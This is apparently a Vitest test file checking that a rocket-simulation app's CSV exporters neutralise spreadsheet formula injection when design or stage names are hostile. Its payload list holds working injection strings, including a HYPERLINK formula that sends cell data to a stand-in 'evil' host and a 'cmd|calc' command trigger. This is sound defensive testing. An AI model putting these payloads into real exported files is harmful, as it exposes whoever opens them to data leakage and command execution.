import { describe, it, expect } from 'vitest';
import { aeroTableCsv, flightDataCsv, flightEventsCsv, runTableCsv } from '../../../src/services/exports/csvExport';
import {
  EXPORT_FORMATS,
  renderUserTemplate,
  type FlightPathModel,
} from '../../../src/services/exports/flightPathExport';
import { buildComponentCsv, buildDesignCsv } from '../../../src/services/report/reportCsv';
import type { ReportModel } from '../../../src/services/report/reportModel';
import type { AeroSweep, FlightResult, StaticInfo } from '../../../src/engine/openRocketEngine';
import type { EventRow } from '../../../src/services/flight/flightEvents';
import { METRIC_UNITS } from '../../../src/prefs/units';
import en from '../../../src/i18n/locales/en.json';
import { localeTranslator } from '../../testing/localeTranslator';

const tEn = localeTranslator(en);

/**
 * Spreadsheet formula injection, checked the way a spreadsheet reads the file
 * rather than the way the writer meant it.
 *
 * Excel opens a `.csv` with its locale's list separator, `,` in some locales
 * and `;` in others, whatever separator the file used, and a tab splits too.
 * It strips the quoting from a cell before deciding whether the cell is a
 * formula. So every line of every CSV writer is split naively on each of those
 * characters, quotes ignored, and no piece may lead with a trigger unless it is
 * a whole number. A piece that leads with spaces is checked after them. A
 * piece that opens with a quoted field is judged by that field, so a line that
 * stays whole because it holds no `;` and starts with the writer's own quoted
 * negative figure is not flagged.
 *
 * Every text slot a writer has is filled with a hostile name, as a shared .ork
 * can supply.
 */

const TRIGGER = /^[=+\-@\t\r]/;
const NUMBER = /^-?(\d+\.?\d*|\.\d+)(e[+-]?\d+)?$/i;

/** The pieces of `csv` that a spreadsheet splitting on `split` would evaluate. */
function liveCells(csv: string, split: string): string[] {
  return csv
    .split('\r\n')
    .flatMap((line) => line.split(split))
    .filter((piece) => {
      const quoted = piece.startsWith('"');
      const text = piece.replace(/^"/, '').replace(/^ +/, '');
      const lead = quoted ? text.split('"')[0]! : text;
      return TRIGGER.test(text) && !NUMBER.test(lead);
    });
}

const PAYLOADS = [
  '=HYPERLINK("http://evil/?"&A1,"Open")',
  '+1+1',
  '-1+HYPERLINK("http://evil/")',
  '-.5+cmd|calc',
  '@SUM(A1)',
  '\t=1',
  'x,=HYPERLINK("http://evil/")',
  'x;=1',
  'x\t=2',
  'x; -1+1',
  'Mk "II";@SUM(A1)',
];

const READER_SPLITS = [',', ';', '\t'];

/** Every split a reader might make, for a file written with `sep`. */
const splitsFor = (sep: string) => (READER_SPLITS.includes(sep) ? READER_SPLITS : [...READER_SPLITS, sep]);

/** The live cells for each split that has any, keyed by the split character. */
function liveCellsBySplit(csv: string, splits: readonly string[]): Record<string, string[]> {
  const out: Record<string, string[]> = {};
  for (const split of splits) {
    const live = liveCells(csv, split);
    if (live.length) out[JSON.stringify(split)] = live;
  }
  return out;
}

/** Split one RFC-4180 line on `sep`, honoring quotes, as a conforming reader does. */
function fields(line: string, sep = ','): string[] {
  const out: string[] = [];
  let cur = '';
  let quoted = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i]!;
    if (quoted) {
      if (c !== '"') cur += c;
      else if (line[i + 1] === '"') {
        cur += '"';
        i++;
      } else quoted = false;
    } else if (c === '"') quoted = true;
    else if (c === sep) {
      out.push(cur);
      cur = '';
    } else cur += c;
  }
  out.push(cur);
  return out;
}

describe('flightDataCsv', () => {
  const result = (stage: string) =>
    ({
      branches: [
        {
          name: stage,
          series: { time: [0, 1], altitude: [-150, 1e-9] },
          events: [],
        },
      ],
    }) as unknown as FlightResult;

  for (const sep of [',', ';', '\t', ' ']) {
    describe(`with the ${JSON.stringify(sep)} separator`, () => {
      it.each(PAYLOADS)('leaves no live cell for the names %j', (bad) => {
        const csv = flightDataCsv(
          result(bad),
          METRIC_UNITS,
          { columns: ['time', 'altitude'], separator: sep, columnName: () => bad },
          bad,
        );
        expect(liveCellsBySplit(csv, splitsFor(sep))).toEqual({});
      });

      it('keeps the simulation and stage comments on one cell where the file is read on a comma', () => {
        const csv = flightDataCsv(
          result('Stage,=1'),
          METRIC_UNITS,
          { columns: ['time'], separator: sep },
          'x,=HYPERLINK("http://evil/?"&A1)',
        );
        const [sim, stage] = csv.split('\r\n');
        expect(sim).toMatch(/^# Simulation: /);
        expect(stage).toMatch(/^# Stage: /);
        for (const line of [sim!, stage!]) expect(line).not.toMatch(/[,;\t]/);
      });

      it('writes negative and exponential figures unchanged', () => {
        const body = (exponential: boolean) =>
          flightDataCsv(result('S'), METRIC_UNITS, {
            columns: ['time', 'altitude'],
            separator: sep,
            simDescription: false,
            fieldDescriptions: true,
            flightEvents: false,
            decimals: 2,
            exponential,
          })
            .split('\r\n')
            .slice(1, 3);
        expect(body(false)).toEqual([`0.00${sep}-150.00`, `1.00${sep}0.00`]);
        expect(body(true)).toEqual([`0.00e+0${sep}-1.50e+2`, `1.00e+0${sep}1.00e-9`]);
      });
    });
  }
});

describe('aeroTableCsv', () => {
  const sweep = (name: string) =>
    ({
      machs: [0.5],
      powerOff: { total: [0.5], friction: [0.1], pressure: [0.2], base: [0.2] },
      powerOn: { total: [0.6] },
      cp: [-0.01],
      cna: [2.0],
      hasNozzle: false,
      components: [{ name, cd: [-0.002] }],
    }) as unknown as AeroSweep;

  it.each(PAYLOADS)('leaves no live cell for the component %j', (bad) => {
    expect(liveCellsBySplit(aeroTableCsv(sweep(bad), METRIC_UNITS), READER_SPLITS)).toEqual({});
  });

  it('keeps a component name with a comma or quote in one column', () => {
    const head = aeroTableCsv(sweep('Fin, "aft"'), METRIC_UNITS).split('\r\n')[0]!;
    expect(fields(head).at(-1)).toBe('Cd_Fin, "aft"');
  });

  it('writes negative and exponential figures unchanged', () => {
    const row = aeroTableCsv(sweep('Nose'), METRIC_UNITS).split('\r\n')[1]!;
    expect(row.split(',')).toEqual(['0.500', '0.5', '0.1', '0.2', '0.2', '-1', '2', '-0.002']);
  });
});

describe('flightEventsCsv', () => {
  const row = {
    key: '0:APOGEE:5:0',
    type: 'APOGEE',
    time: 5,
    branch: 0,
    branchName: 'S',
    source: 'Main',
    altitude: -1.5,
    velocity: -2.5,
    stability: null,
    twr: null,
    aoa: null,
    mach: null,
    q: null,
  } as unknown as EventRow;

  it.each(PAYLOADS)('leaves no live cell for the names %j', (bad) => {
    const csv = flightEventsCsv(
      [{ ...row, source: bad }],
      METRIC_UNITS,
      tEn,
      () => bad,
      () => bad,
      bad,
    );
    expect(liveCellsBySplit(csv, READER_SPLITS)).toEqual({});
  });

  it('round-trips a name with quotes and a comma', () => {
    const csv = flightEventsCsv(
      [{ ...row, source: 'Chute "A", main' }],
      METRIC_UNITS,
      tEn,
      () => 'E',
      () => 'S',
    );
    expect(fields(csv.split('\r\n')[1]!)[2]).toBe('Chute "A", main');
  });

  it('writes negative and exponential figures unchanged', () => {
    const cells = fields(
      flightEventsCsv(
        [row],
        METRIC_UNITS,
        tEn,
        () => 'E',
        () => 'S',
      ).split('\r\n')[1]!,
    );
    expect(cells[4]).toBe('-1.5');
    expect(cells[5]).toBe('-2.5');
  });
});

describe('runTableCsv', () => {
  const flown = {
    summary: { maxAltitude: -2, maxVelocity: -0.5 },
    events: [],
    series: { time: [0, 1], altitude: [0, 1], velocity: [0, 1], mach: [0, 0.1], aoa: [0, 0] },
  } as unknown as FlightResult;

  it.each(PAYLOADS)('leaves no live cell for the names %j', (bad) => {
    const csv = runTableCsv(
      [{ name: bad, configuration: bad, motors: bad, status: bad, result: flown }],
      METRIC_UNITS,
      tEn,
    );
    expect(liveCellsBySplit(csv, READER_SPLITS)).toEqual({});
  });

  it('round-trips a name with quotes', () => {
    const csv = runTableCsv([{ name: 'The "Big" one', configuration: '', motors: '', status: '' }], METRIC_UNITS, tEn);
    expect(fields(csv.split('\r\n')[1]!)[0]).toBe('The "Big" one');
  });

  it('writes negative and exponential figures unchanged', () => {
    const csv = runTableCsv(
      [{ name: 'A', configuration: '', motors: '', status: '', result: flown }],
      METRIC_UNITS,
      tEn,
    );
    const cells = fields(csv.split('\r\n')[1]!);
    expect(cells[4]).toBe('-2');
    expect(cells[5]).toBe('-0.5');
  });
});

describe('design and component CSV', () => {
  const info = {
    length: 0.9,
    lengthAerodynamic: 0.8,
    refDiameter: 0.079,
    mass: 4.25,
    massEmpty: 3.43,
    cg: -0.25,
    cgEmpty: 1.244,
    cp: 1.629,
    cna: 26.42,
    stabilityCalibers: -3.14,
    stabilityPercent: 30.9,
    rollInertia: 0.0054,
    pitchInertia: 1.83,
    cd: 1.115,
  } as unknown as StaticInfo;
  const model = (bad: string): ReportModel => ({
    name: bad,
    stages: [{ type: 'stage' }] as never,
    whole: { label: bad, info },
    stageSummaries: [{ label: bad, info }],
    configs: [],
    partsByStage: [
      {
        stage: bad,
        rows: [{ depth: 0, type: 'bodytube', name: bad, material: bad, length: 0.3, outerR: 0.0125, mass: 0.02 }],
      },
    ],
    finSetsByStage: [
      {
        stage: bad,
        sets: [
          { name: bad, type: 'trapezoidfinset', topX: 1.1, bottomX: 1.2 },
          { name: bad, type: 'trapezoidfinset', topX: -0.1, bottomX: 1.2 },
        ],
      },
    ],
  });

  it.each(PAYLOADS)('leaves no live cell in the design CSV for the names %j', (bad) => {
    expect(liveCellsBySplit(buildDesignCsv(model(bad), METRIC_UNITS), READER_SPLITS)).toEqual({});
  });

  it.each(PAYLOADS)('leaves no live cell in the component CSV for the names %j', (bad) => {
    expect(
      liveCellsBySplit(
        buildComponentCsv(model(bad), METRIC_UNITS, () => bad),
        READER_SPLITS,
      ),
    ).toEqual({});
  });

  it('round-trips a name with quotes and a semicolon', () => {
    const csv = buildDesignCsv(model('Mk "II"; lite'), METRIC_UNITS);
    const name = csv.split('\r\n').find((l) => l.startsWith('Design,Name,'))!;
    expect(fields(name)[2]).toBe('Mk "II"; lite');
  });

  it('writes negative figures unchanged', () => {
    const rows = buildDesignCsv(model('R'), METRIC_UNITS)
      .split('\r\n')
      .map((l) => fields(l));
    const value = (scope: string, field: string) => rows.find((r) => r[0] === scope && r[1] === field)?.[2];
    expect(value('Rocket', 'CG (Loaded)')).toBe('-25');
    expect(value('Rocket', 'Stability (on pad)')).toBe('-3.14');
    expect(rows.filter((r) => r[1] === 'R: Nose to top of fin root').map((r) => r[2])).toContain('-10');
  });
});

describe('waypoint CSV and user CSV templates', () => {
  const waypointSource = EXPORT_FORMATS.find((f) => f.id === 'waypoints-csv')!.source;
  const model = (bad: string) =>
    ({
      title: bad,
      rocketName: bad,
      motor: bad,
      altitudeUnit: 'm',
      distanceUnit: 'm',
      branches: [
        {
          csvPinColor: 'yellow',
          waypoints: [
            {
              altitude: '-12.5',
              latitudeStr: '28.500000',
              longitudeStr: '-80.600000',
              type: 'apogee',
              label: bad,
              distance: '1.5e-4',
              bearing: '90',
            },
          ],
        },
      ],
    }) as unknown as FlightPathModel;

  it.each(PAYLOADS)('leaves no live cell in the waypoint CSV for the names %j', (bad) => {
    expect(liveCellsBySplit(renderUserTemplate(waypointSource, 'csv', model(bad)), READER_SPLITS)).toEqual({});
  });

  it.each(PAYLOADS)('leaves no live cell in a user template for the name %j', (bad) => {
    // A template cell holding only the name: the case the escaper exists for.
    expect(
      liveCellsBySplit(renderUserTemplate('"{{rocketName}}",{{title}}\r\n', 'csv', model(bad)), READER_SPLITS),
    ).toEqual({});
  });

  it('writes the numeric fields unchanged', () => {
    const row = renderUserTemplate(waypointSource, 'csv', model('R')).split('\r\n')[1]!;
    expect(fields(row).slice(0, 3)).toEqual(['-12.5', '28.500000', '-80.600000']);
    const t = renderUserTemplate('{{distance}}', 'csv', { distance: '-2E+3' } as unknown as FlightPathModel);
    expect(t).toBe('-2E+3');
  });

  it('round-trips a name with quotes', () => {
    const row = renderUserTemplate('"{{rocketName}}"', 'csv', model('Mk "II"'));
    expect(fields(row)).toEqual(['Mk "II"']);
  });
});
